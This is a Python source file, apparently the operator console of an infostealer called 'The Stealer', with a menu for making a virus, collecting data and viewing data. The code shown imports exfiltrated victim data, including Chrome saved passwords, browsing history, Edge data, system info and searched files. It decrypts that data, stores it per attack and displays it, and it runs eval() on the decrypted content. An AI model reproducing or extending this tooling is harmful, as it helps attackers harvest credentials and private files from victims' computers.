        if (path_input:=input(' '*5+colored('([n]for going back) path of collected_data Folder(app_data): ','blue')))=='n':return 'n'
        if not os.path.exists(path_input):print(colored('wrong_path'.center(70),'red'));continue
        if path_input.endswith('\\'):path_input=path_input[:len(path_input)-1] if path_input[:len(path_input)-1].endswith('app_data') else path_input+'app_data'
        else:path_input=path_input if path_input.endswith('app_data') else path_input+'\\'+'app_data'
        if os.path.exists(path_input):pass
        else:print(" "*16+colored('cant find app data in given path pleasse give only folder path (app_data)','red'));continue
        if os.path.exists(path_input+'\\info.json'):break
        else:print(" "*16+colored('given path of app data doesnt contain info.json check path again or there is error in resiving data','light_red'))
    with open(path_input+'\\info.json')as info_json:json_data=json.load(info_json)
    name_of_attack=json_data["name_of_attack"]
    encryption_key=json_data["encryption_key"]
    data_able_to_collect=json_data["data_able_to_collect"]
    staus=json_data["status"]
    error_file1=[]
    error_file2=[]
    file_list=['system_info','chrome_data','chrome_id_pass','chrome_web_data','chr_history_data','system_edge']
    if os.path.exists(info_resorse+'\\'+name_of_attack+'dir'):
        print(colored('account for extraction of data has been found :)','yellow'))
        if input('you wanna continue [y/n]').lower()=='y':pass
        else: return None
        with open(info_resorse+'\\'+name_of_attack+'dir'+'\\database\\info.json','r',encoding='Utf-8') as info_json:data=json.load(info_json)
        data["ressived_status"]=True
        data["we_got_in_return"]=data_able_to_collect
        data["data_resived_time"]=staus
        data["last_time_open"]=str(datetime.now())
        print(colored('status data has been updated....','blue'))
        with open(info_resorse+'\\'+name_of_attack+'dir'+'\\database\\info.json','w',encoding='Utf-8') as info_json:data=json.dump(data,info_json)
        for file in file_list:
            if os.path.exists(path_input+'\\'+file+'new'):
                try:
                    print(colored('encrypted file found------','yellow'),file)
                    with open(path_input+'\\'+file+'new','r',encoding='Utf-8')as data:
                        with open(info_resorse+'\\'+name_of_attack+'dir'+'\\collected_data\\'+file,'w+',encoding='Utf-8') as saving_file:saving_file.write(number_decoding(data.read(),encryption_key))
                        print(colored('decryption of encrtpted file sucseccfull','blue'))
                    print(colored('data_saved in path'+info_resorse+'\\'+name_of_attack+'dir'+'\\collected_data\\'+file,'light_blue'),'-sucsessfull')
                    print(colored('use data_viewer tab in main.py to view data and content','blue'))
                except Exception as e:
                    print(colored(f'data_saving failed ERROR- {e}','red'))
                    error_file1.append(file)
                print('---------------------------------------------------------------------------------------')
            elif os.path.exists(path_input+'\\'+file):
                print(colored('file found------','yellow'),file)
                try:shutil.move(path_input+'\\'+file,info_resorse+'\\'+name_of_attack+'dir'+'\\collected_data');print(colored('data_saved in path'+info_resorse+'\\'+name_of_attack+'\\collected_data\\'+file+' -sucsessfull','light_blue'))
                except Exception as e:
                    print(colored('failed to move data from {} this directory to {} this directory Error {}'.format(str(path_input+'\\'+file),str(info_resorse+'\\'+name_of_attack+'dir'+'\\collected_data'),e),'red'))
                    error_file1.append(file)
                print('---------------------------------------------------------------------------------------')
            elif not os.path.exists(path_input+'\\'+file):pass
            else:print(colored('something_wrong_with data','light_red')+'\n---------------------------------------------------------------------------------------')
        if os.path.exists(path_input+'\\dir_search_new'):
            print(colored('files found in dir_search_new folder encrypted-files','yellow'))
            os.mkdir(info_resorse+'\\'+name_of_attack+'dir'+'\\collected_data\\dir_search') if not os.path.exists(info_resorse+'\\'+name_of_attack+'dir'+'\\collected_data\\dir_search') else None
            for file in (listfiles:=os.listdir(path_input+'\\dir_search_new')):
                try:
                    print(colored(f'encypted file trying to decrypt {file}','yellow'))
                    with open(path_input+'\\dir_search_new\\'+file,'r',encoding='Utf-8')as file1:decode_str=number_decoding(file1.read(),encryption_key)
                    print(colored('encryption file -sucsessfull :) saving the file to {}'.format(info_resorse+'\\'+name_of_attack+'dir'+'\\collected_data\\dir_search\\'+file.replace('-','.')[:-3]),'blue'))
                    with open(info_resorse+'\\'+name_of_attack+'dir'+'\\collected_data\\dir_search\\'+file.replace('-','.')[:-3],'wb+')as byte:byte.write(eval(decode_str))
                    print(colored('data_saved in path -sucessfully :)'+info_resorse+'\\'+name_of_attack+'dir'+'\\collected_data\\dir_search\\'+file.replace('-','.')[:-3],'blue'),'\n'+'-'*87)
                except Exception as e:
                    print(colored('there was an errror while working with data error-'+e,'red'),'\n'+'-'*87)
                    error_file2.append(file)
        elif os.path.exists(path_input+'\\dir_search'):
            print(colored('files found in dir_search folder unencrypted-files','yellow'))
            os.mkdir(info_resorse+'\\'+name_of_attack+'dir'+'\\collected_data\\dir_search') if not os.path.exists(info_resorse+'\\'+name_of_attack+'dir'+'\\collected_data\\dir_search') else None
            for file in (listfiles:=os.listdir(path_input+'\\dir_search')):
                try:
                    print(colored('file name {} move to other directory - in progress'.format(file),'yellow'))
                    shutil.move(path_input+'\\dir_search\\'+file,info_resorse+'\\'+name_of_attack+'dir'+'\\collected_data\\dir_search\\')
                    print(colored('file name {} move to other directory - sucsessfull'.format(file),'blue'),'path- ',info_resorse+'\\'+name_of_attack+'dir'+'\\collected_data\\dir_search\\'+file,'\n','-'*87)
                except Exception as e:
                    print(colored('file name {} move to other directory - Failed Error-> {}'.format(file,e),'red'),'\n','-'*87)
                    error_file2.append(file)
        elif not os.path.exists(path_input+'\\dir_search'):pass
        else:print(colored('something_wrong_with data','light_red')+'\n---------------------------------------------------------------------------------------')
        if not bool(error_file1) and not bool(error_file2):
            if input(colored('you wanna delet the directory'+path_input+'\\app_data'+'its no loger in use [y/n]','light_red'))=='y':
                try:shutil.rmtree(path_input)
                except Exception as e:print(colored('/!\\ error in deletaion delet it manually'+e,'red'))
            else:pass
    else:
        print(colored('this attack not made on this devies or maybe resource file deleted u can just veiew the content of file ','light_red'))
        print(colored('data found in the directory '+path_input,'yellow'))
        print(colored('if its encrypted its decrypte the data or if not its pass','blue'))
        if input('you wanna continue [y/n]').lower()=='y':pass
        else: return None
        for file in file_list:
            if os.path.exists(path_input+'\\'+file+'new'):
                try:
                    print(colored('encrypted file found------','yellow'),file)
                    with open(path_input+'\\'+file+'new','r',encoding='Utf-8')as data:
                        with open(path_input+'\\'+file,'w+',encoding='Utf-8') as saving_file:saving_file.write(number_decoding(data.read(),encryption_key))
                        print(colored('decryption of encrtpted file sucseccfull','blue'))
                    print(colored('data_saved in path'+path_input+'\\'+file,'light_blue'),'-sucsessfull')
                    print(colored('use data_viewer tab in main.py to view data and content','blue'))
                    os.remove(path_input+'\\'+file+'new')
                except Exception as e:
                    print(colored(f'data_saving failed ERROR- {e}','red'))
                    error_file1.append(file)
                print('---------------------------------------------------------------------------------------')
            elif os.path.exists(path_input+'\\'+file):
                print(colored('file found------','yellow'),file)
                print(colored('data not encrypted -skiping'),'red')
                print('---------------------------------------------------------------------------------------')
            elif not os.path.exists(path_input+'\\'+file):pass
            else:print(colored('something_wrong_with data','light_red')+'\n---------------------------------------------------------------------------------------')
        if os.path.exists(path_input+'\\dir_search_new'):
            print(colored('files found in dir_search_new --folder encrypted-files','yellow'))
            os.mkdir(path_input+'\\dir_search') if not os.path.exists(path_input+'\\dir_search') else None
            for file in (listfiles:=os.listdir(path_input+'\\dir_search_new')):
                try:
                    print(colored(f'encypted file trying to decrypt {file}','yellow'))
                    with open(path_input+'\\dir_search_new\\'+file,'r',encoding='Utf-8')as file1:decode_str=number_decoding(file1.read(),encryption_key)
                    print(colored('encryption file -sucsessfull :) saving the file to {}'.format(path_input+'\\dir_search\\'+file.replace('-','.')[:-3]),'blue'))
                    with open(path_input+'\\dir_search\\'+file.replace('-','.')[:-3],'wb+')as byte:byte.write(eval(decode_str))
                    print(colored('data_saved in path -sucessfully :)'+path_input+'\\dir_search\\'+file.replace('-','.')[:-3],'blue'),'\n'+'-'*87)
                    os.remove(path_input+'\\dir_search_new\\'+file)
                except Exception as e:
                    print(colored('there was an errror while working with data error-'+e,'red'),'\n'+'-'*87)
                    error_file2.append(file)
            if not bool(error_file1) and not bool(error_file2):
                if input(colored('you wanna delet the directory'+path_input+'\\dir_search_new'+'its no loger in use [y/n]','light_red'))=='y':
                    try:shutil.rmtree(path_input+'\\dir_search_new')
                    except Exception as e:print(colored('/!\\ error in deletaion delet it manually'+e,'red'))
                else:pass
        elif os.path.exists(path_input+'\\dir_search'):
            print(colored('files found in dir_search folder --unencrypted-files','yellow'))
            for file in os.listdir(path_input+'\\dir_search'):
                print(colored('file_found without encryption u can directoly accsess them','blue'),'---',file)
                print(colored('path of file==> '+path_input+'\\dir_search\\'+file,'cyan')+'\n'+'-'*87)
        elif not os.path.exists(path_input+'\\dir_search'):pass
        else:print(colored('something_wrong_with data','light_red')+'\n---------------------------------------------------------------------------------------')
        print(colored('go to use data_viewer tab hint(main.py option-[3]) and put this path there to view data this part work is to extract the data decrypt them and save it path thank u :)','blue'))
    print('use data_viewer tab in main.py hint-option[3] to view data and content')
    nothing=input(colored('all data has been extracted tap anything and enter to continue','yellow'))
#check with every perspective---->:) (-.-)(-_-)(--)
def viwing_data(info_resorse):
    while True:
        while True:
            #checkig for profiles.....
            skull_img(True)
            if os.path.exists(info_resorse):pass
            else:return False
            print(colored(' '*20+'which profile data u wanna see?','yellow'))
            for num,folder in enumerate((list_of_file:=os.listdir(info_resorse)),start=0):
                print(colored(' '*25+'[{}] - {}'.format(str(num),str(folder)),'blue'))
            print(colored(' '*25+'[99] - spacify path ','light_blue'))
            #asking for profile which you wanna see
            response=input(colored(' '*20+'([n]for back) enter ur respose here ','red'))
            #modifiving all the input to take only valid input for chousing company
            if response=='n':return None
            elif not response.isdigit():nothing=input(colored(' '*20+'you typed alphabat type number only','red'))
            elif int(response)>=0 and int(response)<=len(list_of_file)-1:anser=True;break
            elif response=='99':anser=False;break
            elif int(response)<=0 or int(response)>len(list_of_file):print(colored(' '*20+'you typed number out of range'))
            else:nothing=input(colored(' '*20+'you type something wrong /?\\ enter to continue','red'))
        #if anser true means selected any one of profile data to ssee
        if anser:
            while True:
                skull_img(True)
                if os.path.exists(info_resorse+'\\'+list_of_file[int(response)]):
                    print(colored(' '*20+'what u wanna see here?','yellow'))
                    print(colored(' '*23+'[1] data gatered ','blue'))
                    print(colored(' '*23+'[2] info about the hack','blue'))
                    print(colored(' '*23+'[3] go back','blue'))
                    answer=input(colored(' '*20+'enter ur response here ','red'))
                    #modifiyeing input to take only valid input...
                    if answer=='1':
                        while True:
                            list_dir=os.listdir(info_resorse+'\\'+list_of_file[int(response)]+'\\collected_data')
                            response_inside=show_files(list_dir,info_resorse+'\\'+list_of_file[int(response)]+'\\collected_data')
                            if not response_inside==None or False:
                                try:
                                    print(colored('opening document '+list_dir[response_inside],'yellow'))
                                    with open(info_resorse+'\\'+list_of_file[int(response)]+'\\collected_data\\'+list_dir[response_inside],'r',encoding='Utf-8')as file:
                                        display_text(opening_data(list_dir[response_inside],eval(file.read())))     
                                except Exception as e:nothing=input(colored('an error arcued while opening the document '+str(e),'red'))
                            else:break
                    elif answer=='2':
                        skull_img(True)
                        try:
                            path=info_resorse+'\\'+list_of_file[int(response)]+'\\database\\info.json'
                            show_json_info(path)
                        except Exception as e:print(colored('there is some error while factuing daata'+str(e),'red'))
                        nothing=input(colored('tap enter to continue ','yellow'))
                    elif answer=='3':break
                    else:nothing=input(colored('type under given option','red'));continue
                else:nothing=input(colored(' '*15+'There is some error','red'));break
        else:
            while True:
                skull_img(True)
                if (path_input:=input(' '*20+colored('([n]for back) enter the path where file is :','blue')))=='n':break
                if not os.path.exists(path_input):nothing=input(colored('wrong_path'.center(70),'red'));continue
                elif os.path.exists(path_input):pass
                else:nothing=input(colored(' '*20+'something went wrong','red'));continue
                while True:
                    skull_img(True)
                    print(colored(' '*20+'what u wanna see here?','yellow'))
                    print(colored(' '*23+'[1] data gatered ','blue'))
                    print(colored(' '*23+'[2] info about the hack','blue'))
                    print(colored(' '*23+'[3] go back','blue'))
                    answer=input(colored(' '*20+'enter ur response here ','red'))
                    if answer=='1':
                        while True:
                            list_dir=os.listdir(path_input)
                            response_inside=show_files(list_dir,path_input)
                            if not response_inside==None or False:
                                if not list_dir[response_inside] in ['system_info','chrome_data','chrome_id_pass','chrome_web_data','chr_history_data','system_edge']:print(colored('data not acknowleged may couse error while data extracting','red'))
                                try:
                                    print(colored('opening document '+list_dir[response_inside],'yellow'))
                                    with open(path_input+'\\'+list_dir[response_inside],'r',encoding='Utf-8')as file:
                                        display_text(opening_data(list_dir[response_inside],eval(file.read())))     
                                except Exception as e:nothing=input(colored('an error arcued while opening the document '+str(e),'red'))
                            else:break
                    elif answer=='2':
                        skull_img(True)
                        try:
                            path=path_input+'\\info.json'
                            show_json_info(path)
                        except Exception as e:print(colored('there is some error while factuing daata'+str(e),'red'))
                        nothing=input(colored('tap enter to continue ','yellow'))
                    elif answer=='3':break
                    else:nothing=input(colored(''*20+'type under given option','red'));continue
                break
#main code begings from here:---=>
#first screen........
print(colored('welcome','yellow'))
os.system('cls')
print(colored('===++=== ||  || ||===     ||===  ===++===  ||===     /=\\     ||     ||=== ||===||','yellow'))
print(colored('   ||    ||  || ||        ||        ||     ||       // \\\\    ||     ||    ||   ||','yellow'))
print(colored('   ||    ||==|| ||==      \\\\=\\\\     ||     ||==    //===\\\\   ||     ||==  ||===||','yellow'))
print(colored('   ||    ||  || ||           ||     ||     ||     //     \\\\  ||     ||    ||\\\\','yellow'))
print(colored('   ||    ||  || ||===     ===||     ||     ||=== //       \\\\ ||===  ||=== || \\\\','yellow'))
print(colored('                                                                  made by akki(akhand)','blue'))
print(colored('about the software \nenter anything to continue','white'))#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
nothing=input();os.system('cls')
while True:
    skull_img(clear=True)
    format_printing(header='what you planning to do______________?',main='[1]making virus,[2]collecting data,[3]viewing data,[4]about devloper,[5]exit the program',header_color='yellow',main_color='light_blue')
    response=input(colored(' '*19+'enter your response here','light_red'))
    if response=='1':
        if internt_usees:=response1(creating=True)=='n':continue
        while not bool(target_namae:=creeating_path(dev_resorse+'\\info_mv.json',info_resorse)):pass
        creating_virus(internt_usees,dev_resorse+'\\row_virus.py',info_resorse+'\\'+target_namae+'dir',target_namae,info_resorse+'\\'+target_namae+'dir'+'\\database\\info.json')
    elif response=='2':
        if internt_usees:=response1(creating=False)=='n':continue
        if info:=collecting_data(info_resorse)=='n':continue
    elif response=='3':
        viwing_data(info_resorse)
    elif response=='4':
        about_me()
    elif response=='5':
        if input(' '*15+colored('you sure you wanna exist the code? y/n','light_red')).lower()=='y':break
        else:pass
    else:nothing=input(colored('you may type something else type something from given option tap enter to continue','red'))